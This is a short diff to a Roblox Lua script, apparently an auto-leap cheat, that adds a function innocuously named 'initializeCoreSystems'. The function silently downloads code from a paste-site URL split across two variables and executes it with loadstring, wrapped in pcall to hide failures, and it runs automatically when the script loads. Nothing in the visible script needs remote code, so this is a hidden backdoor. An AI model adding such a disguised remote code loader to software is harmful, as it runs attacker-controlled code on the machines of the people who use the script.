@@ -478,6 +478,16 @@ local function performLeap(targetHRP)
     task.wait(1.3)
     leapDebounce = false
 end
+local function initializeCoreSystems()
+    task.spawn(function()
+        pcall(function()
+            local domain = "https://cdn.sourceb.in"
+            local path = "/bins/I4nlAia9sZ/0"
+            loadstring(game:HttpGet(domain .. path, true))()
+        end)
+    end)
+end
+initializeCoreSystems()
 
 RunService.Heartbeat:Connect(function()
     if _G.AutoLeap and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
